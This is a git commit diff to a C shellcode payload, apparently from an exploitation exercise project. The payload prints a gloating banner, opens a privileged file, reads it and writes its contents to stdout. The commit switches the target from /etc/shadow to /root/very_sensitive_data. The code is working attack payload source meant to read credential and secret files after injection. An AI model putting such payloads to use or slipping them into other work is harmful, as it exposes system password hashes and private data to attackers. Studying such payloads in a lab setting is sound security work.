e5763df2f21e7646281d8614db19fdff12fc7a5a
nockty <corentin.dupret@student.ecp.fr>
2020-01-01 23:43:07 +0100

    update etc_shadow payload for python app

--- payload/payload_linux_etc_shadow.c
+++ payload/payload_linux_etc_shadow.c
@@ -9,16 +9,16 @@
 #include "payload_linux_shared.c"
 
 /* We use this define to overcome linker limitations */
-#define WIN_STRING "Hello from shellcode, I will now display /etc/shadow ...\n"
+#define WIN_STRING "Hello from shellcode, I will now display sensitive information. >:)\n"
 
 int main(void)
 {
     sys_write(1 /* stdout */, WIN_STRING, sizeof(WIN_STRING)-1);
 
     char buf[2000];
-    int fd = sys_openat(0 /* ignored */, "/etc/shadow", 0 /* O_RDONLY */);
+    int fd = sys_openat(0 /* ignored */, "/root/very_sensitive_data", 0 /* O_RDONLY */);
     ssize_t read_size = sys_read(fd, buf, sizeof(buf));
     sys_write(1 /* stdout */, buf, read_size);
-    
+
     return 0;
 }
